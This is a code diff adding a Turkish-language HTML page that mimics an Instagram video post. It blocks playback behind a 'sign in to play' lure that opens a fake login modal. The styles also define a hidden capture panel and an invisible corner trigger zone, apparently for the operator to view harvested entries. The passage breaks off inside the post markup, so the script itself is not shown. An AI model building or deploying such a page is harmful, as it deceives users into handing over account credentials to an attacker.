@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { background-color: #fafafa; color: #262626; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; position: relative; }
+        .post-card { width: 100%; max-width: 470px; background: #fff; border: 1px solid #dbdbdb; border-radius: 8px; overflow: hidden; margin-bottom: 20px; }
+        .post-header { display: flex; align-items: center; justify-content: space-between; padding: 14px; border-bottom: 1px solid #efefef; }
+        .post-header-left { display: flex; align-items: center; }
+        .avatar { width: 32px; height: 32px; border-radius: 50%; background: #ccc; margin-right: 12px; background-size: cover; background-position: center; }
+        .username-info { display: flex; flex-direction: column; }
+        .username { font-weight: 600; font-size: 14px; color: #262626; }
+        .location { font-size: 11px; color: #737373; margin-top: 1px; }
+        .verified-badge { display: inline-block; width: 12px; height: 12px; background: #0095f6; border-radius: 50%; margin-left: 4px; text-align: center; color: white; font-size: 8px; line-height: 12px; }
+        .more-options { font-weight: bold; color: #262626; cursor: pointer; }
+        .media-container { position: relative; width: 100%; height: 500px; background: #000; display: flex; align-items: center; justify-content: center; overflow: hidden; }
+        .media-bg { width: 100%; height: 100%; object-fit: cover; filter: blur(22px); opacity: 0.55; transform: scale(1.1); pointer-events: none; }
+        .play-overlay { position: absolute; display: flex; flex-direction: column; align-items: center; justify-content: center; cursor: pointer; z-index: 2; text-align: center; padding: 20px; width: 100%; height: 100%; background: rgba(0,0,0,0.15); }
+        .play-btn { width: 64px; height: 64px; background: rgba(0, 0, 0, 0.6); backdrop-filter: blur(4px); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-bottom: 12px; border: 2px solid rgba(255, 255, 255, 0.8); transition: transform 0.2s; }
+        .play-btn:hover { transform: scale(1.05); }
+        .play-btn svg { width: 24px; height: 24px; fill: #fff; margin-left: 3px; }
+        .lure-text { font-size: 14px; font-weight: 500; color: #fff; text-shadow: 0 1px 4px rgba(0,0,0,0.8); }
+        .post-footer { padding: 12px 14px; font-size: 14px; }
+        .post-actions { display: flex; justify-content: space-between; margin-bottom: 8px; }
+        .post-actions-left svg { width: 24px; height: 24px; margin-right: 16px; cursor: pointer; fill: #262626; }
+        .likes-count { font-weight: 600; font-size: 14px; margin-bottom: 6px; }
+        .caption { font-size: 14px; line-height: 1.4; color: #262626; }
+        .caption span { font-weight: 600; margin-right: 6px; }
+        #login-modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.65); backdrop-filter: blur(5px); display: none; align-items: center; justify-content: center; z-index: 1000; }
+        .modal-box { background-color: #ffffff; color: #262626; border: 1px solid #dbdbdb; border-radius: 8px; padding: 40px; width: 350px; text-align: center; box-shadow: 0 4px 24px rgba(0,0,0,0.15); }
+        .logo { font-size: 2.5rem; margin-bottom: 20px; font-weight: bold; letter-spacing: -1px; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto; color: #000; }
+        .inline-banner { background: #fff8f8; border: 1px solid #ffdbdb; color: #ed4956; padding: 12px; font-size: 13px; border-radius: 4px; margin-bottom: 16px; line-height: 1.4; display: none; text-align: left; }
+        input { width: 100%; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 4px; padding: 10px 12px; font-size: 13px; margin-bottom: 6px; outline: none; transition: border-color 0.2s; }
+        input:focus { border-color: #a8a8a8; }
+        button { width: 100%; background-color: #0095f6; border: none; border-radius: 4px; color: white; font-weight: 600; padding: 9px; cursor: pointer; margin-top: 10px; font-size: 14px; transition: background-color 0.2s; }
+        button:hover { background-color: #1877f2; }
+        #capture-panel { position: fixed; bottom: 15px; right: 15px; width: 340px; background: #1e1e1e; color: #0f0; border: 1px solid #333; border-radius: 6px; box-shadow: 0 5px 20px rgba(0,0,0,0.4); font-family: monospace; font-size: 11px; display: none; z-index: 99999; overflow: hidden; }
+        .panel-header { background: #2d2d2d; padding: 8px 12px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #444; color: #fff; }
+        .panel-body { max-height: 200px; overflow-y: auto; padding: 8px; }
+        .panel-footer { background: #2d2d2d; padding: 8px; text-align: right; border-top: 1px solid #444; display: flex; justify-content: space-between; align-items: center; }
+        .del-btn { background: #a92222; color: #fff; border: none; padding: 5px 10px; border-radius: 3px; cursor: pointer; font-size: 10px; font-weight: bold; }
+        .del-btn:hover { background: #c52c2c; }
+        .log-item { border-bottom: 1px dashed #333; padding: 8px 0; }
+        .log-item:last-child { border-bottom: none; }
+        #trigger-zone { position: fixed; bottom: 0; right: 0; width: 80px; height: 80px; z-index: 99998; cursor: default; background: transparent; }
+    </style>
+</head>
+<body>
+    <div class="post-card">
+        <div class="post-header">
+            <div class="post-header-left">
+                <div class="avatar" style="background-image: url('https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=100&h=100&fit=crop');"></div>
+                <div class="username-info">
+                    <span class="username">dogal_yasam_tr <span class="verified-badge">✓</span></span>
+                    <span class="location">İstanbul, Türkiye</span>
+                </div>
+            </div>
+            <div class="more-options">...</div>
+        </div>
+        <div class="media-container">
+            <video class="media-bg" autoplay muted loop playsinline>
+                <source src="https://assets.mixkit.co/videos/preview/mixkit-tree-branches-in-the-breeze-1185-large.mp4" type="video/mp4">
+            </video>
+            <div class="play-overlay" onclick="triggerGate()">
+                <div class="play-btn">
+                    <svg viewBox="0 0 24 24"><polygon points="6,4 20,12 6,20"></polygon></svg>
+                </div>
+                <span class="lure-text">Videoyu oynatmak için oturum açın</span>
+            </div>
+        </div>
+        <div class="post-footer">
+            <div class="post-actions">
+                <div class="post-actions-left">
+                    <svg viewBox="0 0 24 24"><path d="M16.792 3.904A4.989 4.989 0 0 1 21.5 9.122c0 3.072-2.652 5.859-5.197 8.43-1.043 1.054-2.134 2.127-3.132 3.045l-.035.032-.03
